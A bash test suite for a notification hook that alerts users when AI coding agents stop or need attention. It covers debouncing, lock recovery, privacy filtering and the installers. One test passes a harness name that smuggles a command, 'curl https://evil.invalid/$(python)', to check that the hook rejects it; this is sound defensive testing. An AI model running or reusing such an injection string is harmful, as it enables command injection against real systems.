#!/usr/bin/env bash
set -uo pipefail
REPO="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
HOOK="$REPO/home/hooks/agent-notify.sh"
TMP="$(mktemp -d)"; trap 'rm -rf "$TMP"' EXIT
CURL="$TMP/curl"; LOG="$TMP/calls"; : > "$LOG"
cat > "$CURL" <<'EOF'
#!/usr/bin/env bash
printf '%s\n' "$*" >> "${MOCK_LOG:?}"
EOF
chmod +x "$CURL"
pass=0; fail=0
ok(){ echo "ok: $1"; pass=$((pass+1)); }; no(){ echo "FAIL: $1"; fail=$((fail+1)); }
run(){ printf '%s' "$2" | PATH="$TMP:$PATH" MOCK_LOG="$LOG" AGENT_NOTIFY_STATE_DIR="$TMP/state" AGENT_NOTIFY_DELAY="${AGENT_NOTIFY_DELAY_TEST:-0.05}" PUSHOVER_APP_TOKEN=app PUSHOVER_USER_KEY=user bash "$HOOK" "$1"; }
count(){ wc -l < "$LOG" | tr -d ' '; }
key(){ printf '%s' "${#1}:$1${#2}:$2" | sha256sum | awk '{print $1}'; }
run_with_state(){ local h="$1" state="$2" payload="$3"; printf '%s' "$payload" | PATH="$TMP:$PATH" MOCK_LOG="$LOG" AGENT_NOTIFY_STATE_DIR="$state" AGENT_NOTIFY_DELAY=2 PUSHOVER_APP_TOKEN=app PUSHOVER_USER_KEY=user bash "$HOOK" "$h"; }
wait_until(){ local deadline=$((SECONDS+5)); while [ "$SECONDS" -lt "$deadline" ]; do "$@" && return 0; sleep 0.02; done; return 1; }
wait_count(){ [ "$(count)" = "$1" ]; }
wait_text(){ grep -Fq -- "$1" "$LOG"; }
# Prompt allow is unconditional; missing credentials must not create work or call sender.
printf '%s' '{"event":"pre_user_prompt"}' | PATH="$TMP:/usr/bin:/bin" AGENT_NOTIFY_STATE_DIR="$TMP/nojq" bash "$HOOK" polytoken | grep -q 'allow' && ok "prompt always allows" || no "prompt always allows"
printf '%s' '{"hook_event_name":"Stop","session_id":"no-creds"}' | PATH="$TMP:$PATH" AGENT_NOTIFY_STATE_DIR="$TMP/missing" AGENT_NOTIFY_DELAY=0.01 bash "$HOOK" claude
wait_until wait_count 0 && [ ! -d "$TMP/missing" ] && ok "missing credentials fail open before worker" || no "missing credentials fail open before worker"
# Unknown/hostile harness identities fail open before state or outbound work.
: > "$LOG"; printf '%s' '{"hook_event_name":"Stop","session_id":"hostile"}' | PATH="$TMP:$PATH" MOCK_LOG="$LOG" AGENT_NOTIFY_STATE_DIR="$TMP/hostile-state" PUSHOVER_APP_TOKEN=app PUSHOVER_USER_KEY=user bash "$HOOK" 'claude;curl https://evil.invalid/$(python);AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' >/dev/null
[ "$(count)" = 0 ] && [ ! -e "$TMP/hostile-state" ] && ok "unknown hostile harness fails open" || no "unknown hostile harness fails open"
# Same harness sessions are independent; events in one session consolidate to latest payload.
run claude '{"hook_event_name":"Stop","session_id":"s1","message":"one"}'
run claude '{"hook_event_name":"Stop","session_id":"s2","message":"two"}'
wait_until wait_count 2 && ok "same-harness distinct-session isolation" || no "same-harness distinct-session isolation"
: > "$LOG"
AGENT_NOTIFY_DELAY_TEST=2 run claude '{"hook_event_name":"Notification","session_id":"same","message":"first"}'
K="$(key claude same)"; wait_until test -s "$TMP/state/$K.gen"
AGENT_NOTIFY_DELAY_TEST=2 run claude '{"hook_event_name":"Notification","session_id":"same","message":"latest"}'
wait_until wait_count 1 && [ "$(grep -Fc first "$LOG" || true)" = 0 ] && grep -q 'agent attention' "$LOG" && ok "same-session consolidation delivers latest category" || no "same-session consolidation delivers latest category"
# Cross-harness namespace isolation and payload identity/title.
: > "$LOG"; run claude '{"hook_event_name":"Stop","session_id":"cross","message":"claude"}' & p1=$!; run polytoken '{"event":"notification","session_id":"cross","message":"poly"}' & p2=$!; wait $p1 $p2
wait_until wait_count 2 && grep -q -- '--data-urlencode title=Agent attention' "$LOG" && grep -q 'session=cross' "$LOG" && ok "cross-harness isolation and identity" || no "cross-harness isolation and identity"
# Prompt cancellation is synchronous and prevents the delayed worker from sending.
: > "$LOG"; AGENT_NOTIFY_DELAY_TEST=0.15 run claude '{"hook_event_name":"Stop","session_id":"cancel","message":"wait"}'
printf '%s' '{"hook_event_name":"UserPromptSubmit","session_id":"cancel"}' | PATH="$TMP:$PATH" MOCK_LOG="$LOG" AGENT_NOTIFY_STATE_DIR="$TMP/state" PUSHOVER_APP_TOKEN=app PUSHOVER_USER_KEY=user bash "$HOOK" claude | jq -e '.outcome == "allow"' >/dev/null
! wait_until wait_text cancel && ok "cancellation prevents delivery" || no "cancellation prevents delivery"
# A newer generation invalidates the old worker before send.
: > "$LOG"; AGENT_NOTIFY_DELAY_TEST=0.5 run claude '{"hook_event_name":"Stop","session_id":"stale","message":"old"}' & p1=$!
K="$(key claude stale)"; wait_until test -s "$TMP/state/$K.gen"
printf '%s' '{"hook_event_name":"UserPromptSubmit","session_id":"stale"}' | PATH="$TMP:$PATH" MOCK_LOG="$LOG" AGENT_NOTIFY_STATE_DIR="$TMP/state" PUSHOVER_APP_TOKEN=app PUSHOVER_USER_KEY=user bash "$HOOK" claude >/dev/null; wait "$p1"
! wait_until wait_text old && ok "stale worker cancellation proven" || no "stale worker cancellation proven"
# Successful delivery clears state and permits a later delivery.
: > "$LOG"; AGENT_NOTIFY_DELAY_TEST=0.01 run claude '{"hook_event_name":"Stop","session_id":"rearm","message":"again"}'; wait_until wait_count 1
AGENT_NOTIFY_DELAY_TEST=0.01 run claude '{"hook_event_name":"Stop","session_id":"rearm","message":"again2"}'; wait_until wait_count 2 && ok "delivery clears and rearms state" || no "delivery clears and rearms state"
# A lock owned by a live process is never reclaimed based on age, even while send is in flight.
: > "$LOG"; K="$(key claude live-lock)"; mkdir -p "$TMP/state/$K.lock"; printf '%s\n' "$$" > "$TMP/state/$K.lock/pid"; printf '%s\n' fixture > "$TMP/state/$K.lock/token"; printf '%s\n' "1" > "$TMP/state/$K.lock/heartbeat"
touch -t 200001010000 "$TMP/state/$K.lock/heartbeat" "$TMP/state/$K.lock"
AGENT_NOTIFY_LOCK_WAIT=1 run claude '{"hook_event_name":"Stop","session_id":"live-lock","message":"must-not-steal"}'
! wait_until wait_text must-not-steal && ok "live owner lock is not reclaimed" || no "live owner lock is not reclaimed"
# A crashed owner is reclaimed after the bounded wait; timestamp setup is portable.
: > "$LOG"; K="$(key claude locked)"; mkdir -p "$TMP/state/$K.lock"; (exit 0) & dead_pid=$!; wait "$dead_pid"; printf '%s\n' "$dead_pid" > "$TMP/state/$K.lock/pid"; printf '%s\n' fixture > "$TMP/state/$K.lock/token"; printf '%s\n' "1" > "$TMP/state/$K.lock/heartbeat"
touch -t 200001010000 "$TMP/state/$K.lock/heartbeat" "$TMP/state/$K.lock"
AGENT_NOTIFY_LOCK_WAIT=1 run claude '{"hook_event_name":"Stop","session_id":"locked","message":"recovered"}'
wait_until wait_count 1 && grep -q 'agent stopped' "$LOG" && ok "crashed-owner lock recovery" || no "crashed-owner lock recovery"
# A partial/legacy lock with a live PID but missing token is never reclaimed.
: > "$LOG"; K="$(key claude partial-live)"; mkdir -p "$TMP/state/$K.lock"; printf '%s\n' "$$" > "$TMP/state/$K.lock/pid"; printf '%s\n' "1" > "$TMP/state/$K.lock/heartbeat"
AGENT_NOTIFY_LOCK_WAIT=1 run claude '{"hook_event_name":"Stop","session_id":"partial-live","message":"must-not-steal"}'
! wait_until wait_text must-not-steal && ok "live partial lock protection" || no "live partial lock protection"
# Partial initialization is reclaimable: an unowned directory is not permanent.
: > "$LOG"; K="$(key claude partial)"; mkdir -p "$TMP/state/$K.lock"; AGENT_NOTIFY_LOCK_WAIT=1 run claude '{"hook_event_name":"Stop","session_id":"partial","message":"recover"}'
wait_until wait_text 'agent stopped' && ok "partial lock recovery" || no "partial lock recovery"
# Delimiter-like IDs remain isolated under length-prefixed keying.
: > "$LOG"; AGENT_NOTIFY_DELAY_TEST=0.01 run claude '{"hook_event_name":"Stop","session_id":"a\u0001b","message":"x"}'; AGENT_NOTIFY_DELAY_TEST=0.01 run claude '{"hook_event_name":"Stop","session_id":"a","message":"y"}'; wait_until wait_count 2 && ok "adversarial session isolation" || no "adversarial session isolation"
# Transcript, secret, and control text are never forwarded; only fixed category and safe metadata are sent.
: > "$LOG"; run claude '{"hook_event_name":"Notification","session_id":"safe/../id","cwd":"/tmp/proj\u0009name","message":"TRANSCRIPT SECRET=shh \u001b[31mCONTROL","notification":"leak","reason":"also-leak"}'; wait_until wait_count 1 && ! grep -Eq 'TRANSCRIPT|SECRET=|CONTROL|leak|shh' "$LOG" && grep -q 'agent attention' "$LOG" && ok "privacy-safe fixed notification" || no "privacy-safe fixed notification"
# Harness defaults and explicit overrides choose independent config roots.
for h in claude polytoken; do
  base="$TMP/default-$h"; mkdir -p "$base"; : > "$LOG"
  HOME="$base" AGENT_NOTIFY_STATE_DIR= PUSHOVER_APP_TOKEN=app PUSHOVER_USER_KEY=user AGENT_NOTIFY_DELAY=2 printf '%s' '{"hook_event_name":"Stop","event":"notification","session_id":"defaults"}' | HOME="$base" PATH="$TMP:$PATH" PUSHOVER_APP_TOKEN=app PUSHOVER_USER_KEY=user AGENT_NOTIFY_DELAY=2 bash "$HOOK" "$h"
  expected="$base/.claude/.agent-notify"; [ "$h" = polytoken ] && expected="$base/.config/polytoken/.agent-notify"
  [ -d "$expected" ] && ok "$h default STATE_DIR" || no "$h default STATE_DIR"
done
for h in claude polytoken; do var="${h^^}_CONFIG_DIR"; custom="$TMP/custom-$h"; : > "$LOG"; env HOME="$TMP/unused" "$var=$custom" AGENT_NOTIFY_DELAY=2 PUSHOVER_APP_TOKEN=app PUSHOVER_USER_KEY=user bash -c "printf '%s' '{\"hook_event_name\":\"Stop\",\"session_id\":\"set\"}' | bash '$HOOK' '$h'"; [ -d "$custom/.agent-notify" ] && ok "$h explicit STATE_DIR" || no "$h explicit STATE_DIR"; done
# Both roots set simultaneously still select the harness-specific root.
CLAUDE_CONFIG_DIR="$TMP/both-claude" POLYTOKEN_CONFIG_DIR="$TMP/both-polytoken" AGENT_NOTIFY_DELAY=2 PUSHOVER_APP_TOKEN=app PUSHOVER_USER_KEY=user bash -c "printf '%s' '{\"hook_event_name\":\"Stop\",\"session_id\":\"both\"}' | bash '$HOOK' claude"
CLAUDE_CONFIG_DIR="$TMP/both-claude" POLYTOKEN_CONFIG_DIR="$TMP/both-polytoken" AGENT_NOTIFY_DELAY=2 PUSHOVER_APP_TOKEN=app PUSHOVER_USER_KEY=user bash -c "printf '%s' '{\"hook_event_name\":\"Stop\",\"session_id\":\"both\"}' | bash '$HOOK' polytoken"
[ -d "$TMP/both-claude/.agent-notify" ] && [ -d "$TMP/both-polytoken/.agent-notify" ] && ok "simultaneous harness-specific roots" || no "simultaneous harness-specific roots"
# Wiring: Notification and Stop async, no standalone SubagentStop notifier.
jq -e '([.hooks.Notification[], .hooks.Stop[]] | map(.hooks[] | select(.command | contains("agent-notify.sh"))) | length == 2 and all(.[]; .async == true))' "$REPO/home/settings.recommended.json" >/dev/null && jq -e '([.hooks.SubagentStop[].hooks[]?.command // ""] | all(.[]; contains("agent-notify.sh") | not))' "$REPO/home/settings.recommended.json" >/dev/null && ok "Claude wiring" || no "Claude wiring"
jq -e '([.[] | select(.name == "agent-notify" and .event == "notification")] | length == 1) and ([.[] | select(.name | startswith("agent-notify")) | .handler.bash | contains(" polytoken")] | all)' "$REPO/polytoken/hooks.json" >/dev/null && ok "Polytoken wiring" || no "Polytoken wiring"
grep -q 'DELAY="${AGENT_NOTIFY_DELAY:-60}"' "$HOOK" && ok "production delay default" || no "production delay default"
# Exercise the actual Claude installer into a temporary destination, then verify status, content, and mode.
DEST="$TMP/installed-claude"; HOME="$TMP/home"; mkdir -p "$HOME"
if CLAUDE_CONFIG_DIR="$DEST" CLAUDE_CONFIG_TTY=/dev/null CLAUDE_CONFIG_OVERWRITE=1 bash "$REPO/install.sh" --target claude --overwrite >/dev/null 2>&1; then
  [ -f "$DEST/hooks/agent-notify.sh" ] && cmp -s "$HOOK" "$DEST/hooks/agent-notify.sh" && [ -x "$DEST/hooks/agent-notify.sh" ] && ok "actual installer status, content, and mode" || no "actual installer status, content, and mode"
else
  no "actual installer status, content, and mode"
fi
# Exercise the actual Polytoken installer when its required yq-v4 dependency exists.
if command -v yq >/dev/null 2>&1 && yq --version 2>/dev/null | grep -Eq 'version v4\.'; then
  PTDEST="$TMP/installed-polytoken"; mkdir -p "$PTDEST/hooks"; cp "$REPO/polytoken/config.recommended.yaml" "$PTDEST/config.yaml"
  printf '%s\n' '[{"name":"unrelated","event":"session_start","handler":{"bash":"keep-me"}},{"name":"agent-notify","event":"notification","handler":{"bash":"old-notifier"}}]' > "$PTDEST/hooks.json"
  if POLYTOKEN_CONFIG_DIR="$PTDEST" POLYTOKEN_CONFIG_TTY=/dev/null bash "$REPO/scripts/install-polytoken.sh" 1 >/dev/null 2>&1; then
    mode="$(stat -c '%a' "$HOOK" 2>/dev/null || stat -f '%Lp' "$HOOK")"; installed_mode="$(stat -c '%a' "$PTDEST/hooks/agent-notify.sh" 2>/dev/null || stat -f '%Lp' "$PTDEST/hooks/agent-notify.sh")"
    jq -e '([.[].name] | {names:., unrelated: (index("unrelated") != null), notifier: (index("agent-notify") != null), cancel: (index("agent-notify-cancel") != null)}) as $n | ($n.unrelated and $n.notifier and $n.cancel and ([.[] | select(.name == "agent-notify")] | length == 1) and ([.[] | select(.name == "agent-notify-cancel")] | length == 1) and ([.[] | select(.name == "unrelated" and .handler.bash == "keep-me")] | length == 1))' "$PTDEST/hooks.json" >/dev/null && cmp -s "$HOOK" "$PTDEST/hooks/agent-notify.sh" && [ -x "$PTDEST/hooks/agent-notify.sh" ] && grep -Fq '${POLYTOKEN_CONFIG_DIR:-$HOME/.config/polytoken}' "$PTDEST/hooks.json" && ok "actual Polytoken installer merge, bytes, mode, paths" || no "actual Polytoken installer merge, bytes, mode, paths"
  else
    no "actual Polytoken installer merge, bytes, mode, paths"
  fi
else
  echo "SKIP: actual Polytoken installer requires mikefarah/yq v4" >&2
  no "actual Polytoken installer (yq v4 unavailable)"
fi
[ "$fail" -eq 0 ] && echo "PASS: $pass" || echo "FAILURES: $fail/$((pass+fail))"; exit "$fail"
